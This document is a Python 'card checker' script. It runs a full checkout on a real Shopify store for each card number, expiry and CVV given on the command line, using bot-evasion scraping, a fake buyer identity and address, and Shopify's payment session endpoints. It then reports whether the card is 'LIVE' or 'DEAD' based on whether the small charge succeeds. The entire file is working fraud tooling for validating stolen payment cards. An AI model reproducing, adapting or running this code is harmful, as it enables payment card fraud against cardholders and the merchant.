#!/usr/bin/env python3
import cloudscraper
import re
import json
import sys
import time

def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

def check_qee(card):
    try:
        cc, mm, yy, cv = card.split('|')
        
        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if len(yy) == 2:
            full_yy = f'20{yy}'
        else:
            full_yy = yy
            yy = yy[-2:]
        
        s = cloudscraper.create_scraper()
        
        # Step 1: Add to cart
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2409BRN2CA Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.amorususa.com',
            'referer': 'https://www.amorususa.com/collections/all-new-everything/products/brow-razors-4-pack',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        data = {
            'quantity': '1',
            'form_type': 'product',
            'utf8': '✓',
            'id': '47313041031426',
            'product-id': '9278929895682',
            'section-id': 'template--16740024910082__main'
        }
        
        s.post('https://www.amorususa.com/cart/add.js', headers=headers, data=data, timeout=15)
        
        # Step 2: Get cart token
        response = s.get('https://www.amorususa.com/cart.js', headers=headers, timeout=15)
        raw_token = response.json()['token']
        token = raw_token.split('?')[0]
        
        # Step 3: Go to cart
        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2409BRN2CA Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.amorususa.com',
            'x-requested-with': 'mark.via.gp'
        }
        
        cart_data = 'updates[]=2&checkout'
        s.post('https://www.amorususa.com/cart', headers=headers2, data=cart_data, timeout=15)
        
        # Step 4: Go to checkout
        params = {
            '_r': 'AQABoGb7zYYTzJ0sYOBRY7qYRc0q0y3hn4KAKhygSx7J',
            'auto_redirect': 'false',
            'edge_redirect': 'true',
            'skip_shop_pay': 'true'
        }
        
        checkout_response = s.get(f'https://www.amorususa.com/checkouts/cn/{token}/en-us', params=params, headers=headers2, timeout=15)
        response_text = checkout_response.text
        
        # Step 5: Extract session data
        x_checkout_one_session_token = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', response_text)
        
        if not x_checkout_one_session_token:
            return {"status": "DEAD", "msg": "Failed to get session token"}
        
        session_token = x_checkout_one_session_token.group(1)
        queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
        stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
        paymentMethodIdentifier = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        
        # Step 6: First proposal
        headers3 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2409BRN2CA Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'x-checkout-one-session-token': session_token,
            'shopify-checkout-client': 'checkout-web/1.0',
            'origin': 'https://www.amorususa.com'
        }
        
        params = {'operationName': 'Proposal'}
        proposal_data = {
            'variables': {
                'sessionInput': {'sessionToken': session_token},
                'queueToken': queue_token,
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'delivery': {
                    'deliveryLines': [{
                        'destination': {
                            'partialStreetAddress': {
                                'address1': '',
                                'city': '',
                                'countryCode': 'US',
                                'lastName': '',
                                'phone': '',
                                'oneTimeUse': False
                            }
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {'any': True},
                                'shipments': {'any': True}
                            },
                            'options': {}
                        },
                        'targetMerchandiseLines': {'any': True},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                },
                'deliveryExpectations': {'deliveryExpectationLines': []},
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': stable_id,
                        'merchandise': {
                            'productVariantReference': {
                                'id': 'gid://shopify/ProductVariantMerchandise/47313041031426',
                                'variantId': 'gid://shopify/ProductVariant/47313041031426',
                                'properties': [],
                                'sellingPlanId': None,
                                'sellingPlanDigest': None
                            }
                        },
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': '5.00', 'currencyCode': 'USD'}},
                        'lineComponentsSource': None,
                        'lineComponents': []
                    }]
                },
                'memberships': {'memberships': []},
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': '',
                            'city': '',
                            'countryCode': 'US',
                            'lastName': '',
                            'phone': ''
                        }
                    }
                },
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                    'phoneCountryCode': 'US',
                    'marketingConsent': [],
                    'shopPayOptInPhone': {'countryCode': 'US'},
                    'rememberMe': False
                },
                'tip': {'tipLines': []},
                'poNumber': None,
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': []
                },
                'note': {'message': None, 'customAttributes': []},
                'localizationExtension': {'fields': []},
                'shopPayArtifact': {
                    'optIn': {
                        'vaultEmail': '',
                        'vaultPhone': '',
                        'optInSource': 'REMEMBER_ME'
                    }
                },
                'nonNegotiableTerms': None,
                'scriptFingerprint': {
                    'signature': None,
                    'signatureUuid': None,
                    'lineItemScriptChanges': [],
                    'paymentScriptChanges': [],
                    'shippingScriptChanges': []
                },
                'optionalDuties': {'buyerRefusesDuties': False},
                'cartMetafields': []
            },
            'operationName': 'Proposal',
            'id': '0ffce413084c78bce6450631a3b3bcb96500b37169a860acb21199b9243f71ae'
        }
        
        proposal_response = s.post('https://www.amorususa.com/checkouts/internal/graphql/persisted', params=params, headers=headers3, json=proposal_data, timeout=15)
        proposal_json = proposal_response.json()
        
        variant = proposal_json['data']['session']['negotiate']['result']['buyerProposal']['merchandise']['merchandiseLines'][0]['merchandise']['id']
        variant2 = proposal_json['data']['session']['negotiate']['result']['buyerProposal']['merchandise']['merchandiseLines'][0]['merchandise']['variantId']
        
        # Step 7: Second proposal with email
        proposal_data2 = proposal_data.copy()
        proposal_data2['variables']['buyerIdentity']['email'] = 'kskslssk@gmail.com'
        proposal_data2['variables']['buyerIdentity']['emailChanged'] = True
        
        s.post('https://www.amorususa.com/checkouts/internal/graphql/persisted', params=params, headers=headers3, json=proposal_data2, timeout=15)
        
        # Step 8: Third proposal with address
        proposal_data3 = proposal_data2.copy()
        proposal_data3['variables']['delivery']['deliveryLines'][0]['destination']['partialStreetAddress'] = {
            'address1': 'street 727738',
            'city': 'hudson',
            'countryCode': 'US',
            'postalCode': '10080',
            'firstName': 'exeee',
            'lastName': 'wayss',
            'zoneCode': 'NY',
            'phone': '',
            'oneTimeUse': False
        }
        proposal_data3['variables']['payment']['billingAddress']['streetAddress'] = {
            'address1': 'street 727738',
            'city': 'hudson',
            'countryCode': 'US',
            'postalCode': '10080',
            'firstName': 'exeee',
            'lastName': 'wayss',
            'zoneCode': 'NY',
            'phone': ''
        }
        
        proposal3_response = s.post('https://www.amorususa.com/checkouts/internal/graphql/persisted', params=params, headers=headers3, json=proposal_data3, timeout=15)
        proposal3_json = proposal3_response.json()
        
        # Step 9: Get client token
        client2 = proposal3_json['data']['session']['negotiate']['result']['sellerProposal']['payment']['availablePaymentLines']
        
        client = None
        for line in client2:
            method = line.get('paymentMethod', {})
            if method.get('name') == 'PAYPAL_EXPRESS':
                client = method.get('clientToken')
                break
        
        if not client:
            return {"status": "DEAD", "msg": "Failed to get client token"}
        
        # Step 10: Create Shopify payment session
        headers4 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2409BRN2CA Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'shopify-identification-signature': client,
            'origin': 'https://checkout.pci.shopifyinc.com'
        }
        
        session_data = {
            'credit_card': {
                'number': cc,
                'month': int(mm),
                'year': int(full_yy),
                'verification_value': cv,
                'start_month': None,
                'start_year': None,
                'issue_number': '',
                'name': 'exeee wayss'
            },
            'payment_session_scope': 'amorususa.com'
        }
        
        session_response = s.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers4, json=session_data, timeout=15)
        session_json = session_response.json()
        
        if 'id' not in session_json:
            return {"status": "DEAD", "msg": "Failed to create payment session"}
        
        session_id = session_json['id']
        
        # Step 11: Submit for completion
        params = {'operationName': 'SubmitForCompletion'}
        submit_data = {
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': session_token},
                    'queueToken': queue_token,
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': 'street 727738',
                                    'city': 'hudson',
                                    'countryCode': 'US',
                                    'postalCode': '10080',
                                    'firstName': 'exeee',
                                    'lastName': 'wayss',
                                    'zoneCode': 'NY',
                                    'phone': '3084619353',
                                    'oneTimeUse': False
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': 'e82a9e90c2e3f128d79afb1ce21d82df-c2b8f7c6ab7882944dfa68ffd5559749',
                                    'customDeliveryRate': False
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'value': {'amount': '5.99', 'currencyCode': 'USD'}},
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': [{
                            'signedHandle': '28frVrL9hHxscbzp9IEWYAjBjWad4OIERI/80IEGtqURA3ggLxJD70Nywvu8Y5TcLvcwIpIMQAuVZ6gyt0ZPos28GNONjf7zFDruiQ6kUPZVQOM90gKcJdP2NXelEJ5XG/Z8uuzdWHi0ewzEugZ4HyJzL4oGepsjbnA8/MnYGOiq3HCgQblUPQm7Mq27QTfpV9RaMQhnC5RqF4HP1Jpg1uV4TkwVYpxFsL+3kZE47+BWYN7WfKLTFmqU+3sO4wpx7lWl3Lxxz0FOA5Ymu9KF3aLP5EFxAX+mHB9+dM1/TCcWQ8IkAyIAJFGmA/N+CO823NqQzzUJD6RLRkTdLcTcRpm4cuxGuhYGCjI+TBkWP1JRoiLlaOqwxTXpkH9f3QYJQVC5NAbNvuKlA+knu+7vi+2SEECZFFkCeWszWa7JT5bESFzC32Nwqv7gF0y2fghPs3pIQ45hNyGD1PnLycqb5axD55rAQ/oGkTVbdr1w2gjN2Mn+5xbpn3pd5sDGSO+E2/LoEE7H/gRHwsyWgqZbAf1mm6eQDiqEFnvJfqpYI46utO1t+EwoqndKQ2+hIz6G/Pv3nCT+46ytPMzwsr5WPZMsfNio2WTibVxhx815cbx6vN/NV5kGODtqKGLUEHwRfuU0TQwaNM+7V68ZPYPX1+jqfZVA7OQDVbVsI/ZDFNDQEP/8ZTLpOwV1lLbJuk90PXr0F9fV57ERYucP7ApfT1Zxl++PaDQAT2TZSIdGsrDUA9+ICR7/odCIXhKXm81BFyLF+XTp30jh4DI3ToojfSDKbbodxnHhnNzUqzok+OT1izeZdn2ZoZMuT1KsMJPsSXsSRJ3Chr4u8CI027S5l2YBQQigY4Ni0qUnXlHcs+x05iCQfQGtHC50W7VymBJt1LdUxa1WIRsO5aKirwhCo1QJBFA1XzpIfPAcwfIs4sSm+zs3upju5+QyfANgfNi2V6wCw6Uu0fY4ZL4y6bzOk9g+tmJAJD6Vl4dP16qfvnfIvgj+zjwEDu2jJEAI5YBTHp7e0rMx3BsQYfmVvrfGMSF3p+58gBM90e8JMMiLSaVBDRC56G48tH8SPmzS92l/FxZIN06d0za/f6d4GrFF/+VvKwrgZlpSOlClkT3Q6jllwzfIILvvuUBvc05FMJtRes8zjAou3M7xQn7zzwwWwFobWFJtPflMEUq1QM+sScMcS/X66RSUdZ88XZLqjq6OBEyt4K0Avfhd8RnDM7sqTqJWBTyKatUzOVj05HGXXTXzhgfjjsHHmdcNb4NWUK8r5dR5OsIGdg6YiuEuobEN8rmEGoqHSaESSvkI2txNtfe/8YAnGfSQc220OnU39k4s4wCP9VAT24Pmj7MCP2otT1GLhykHWoE6kPfxkoxzvx1UkwN+fPO/Qp7Z/Ph7DLkTD11Dpa2oqwBHn6CFf19jQp3FKvTwc3rH3F6YKeVW71hLKu1L+7irP5MkE/GCiiTPiqBesvfk8NLFP4ItkSgxJUM=--CeGc+PhyVFaKCMYo--F9cve2XctfTwIOXNzgiGog=='
                        }]
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stable_id,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': variant,
                                    'variantId': variant2,
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': '5.00', 'currencyCode': 'USD'}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'memberships': {'memberships': []},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': paymentMethodIdentifier,
                                    'sessionId': session_id,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': 'street 727738',
                                            'city': 'hudson',
                                            'countryCode': 'US',
                                            'postalCode': '10080',
                                            'firstName': 'exeee',
                                            'lastName': 'wayss',
                                            'zoneCode': 'NY',
                                            'phone': '3084619353'
                                        }
                                    },
                                    'cardSource': None
                                },
                                'giftCardPaymentMethod': None,
                                'redeemablePaymentMethod': None,
                                'walletPaymentMethod': None,
                                'walletsPlatformPaymentMethod': None,
                                'localPaymentMethod': None,
                                'paymentOnDeliveryMethod': None,
                                'paymentOnDeliveryMethod2': None,
                                'manualPaymentMethod': None,
                                'customPaymentMethod': None,
                                'offsitePaymentMethod': None,
                                'customOnsitePaymentMethod': None,
                                'deferredPaymentMethod': None,
                                'customerCreditCardPaymentMethod': None,
                                'paypalBillingAgreementPaymentMethod': None,
                                'remotePaymentInstrument': None
                            },
                            'amount': {'value': {'amount': '10.99', 'currencyCode': 'USD'}}
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': 'street 727738',
                                'city': 'hudson',
                                'countryCode': 'US',
                                'postalCode': '10080',
                                'firstName': 'exeee',
                                'lastName': 'wayss',
                                'zoneCode': 'NY',
                                'phone': '3084619353'
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                        'email': 'kskslssk@gmail.com',
                        'emailChanged': False,
                        'phoneCountryCode': 'US',
                        'marketingConsent': [],
                        'shopPayOptInPhone': {'number': '3084619353', 'countryCode': 'US'},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'shopPayArtifact': {
                        'optIn': {
                            'vaultEmail': '',
                            'vaultPhone': '',
                            'optInSource': 'REMEMBER_ME'
                        }
                    },
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'cartMetafields': []
                },
                'attemptToken': f'{token}-m1kcb30e7b',
                'metafields': [],
                'analytics': {
                    'requestUrl': f'https://www.amorususa.com/checkouts/cn/{token}/en-us?_r=AQABC1HtVhIb19s9mAbAICXajEfnTRcPBhCMAWyOT2Uj',
                    'pageId': 'b0c991a6-FD07-4661-9F64-FB19AAF236F4'
                }
            },
            'operationName': 'SubmitForCompletion',
            'id': 'afddfef94df797a734e963689da49aed18da6c54a0cb209aa67aef995599d687'
        }
        
        submit_response = s.post('https://www.amorususa.com/checkouts/internal/graphql/persisted', params=params, headers=headers3, json=submit_data, timeout=15)
        submit_json = submit_response.json()
        
        receipt = submit_json['data']['submitForCompletion']['receipt']['id']
        
        # Step 12: Poll for receipt
        params = {
            'operationName': 'PollForReceipt',
            'variables': json.dumps({'receiptId': receipt, 'sessionToken': session_token}),
            'id': 'baa45c97a49dae99440b5f8a954dfb31b01b7af373f5335204c29849f3397502'
        }
        
        max_attempts = 10
        for attempt in range(max_attempts):
            poll_response = s.get('https://www.amorususa.com/checkouts/internal/graphql/persisted', params=params, headers=headers3, timeout=15)
            poll_json = poll_response.json()
            
            typename = poll_json.get('data', {}).get('receipt', {}).get('__typename')
            
            if typename == 'ProcessedReceipt':
                return {"status": "LIVE", "msg": "Payment successful"}
            elif typename == 'ProcessingReceipt':
                time.sleep(1.5)
                continue
            else:
                return {"status": "DEAD", "msg": "Payment failed"}
        
        return {"status": "DEAD", "msg": "Timeout waiting for receipt"}
        
    except Exception as e:
        return {"status": "DEAD", "msg": str(e)}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"status": "DEAD", "msg": "No card provided"}))
        sys.exit(1)
    
    card = sys.argv[1]
    result = check_qee(card)
    print(json.dumps(result))
  
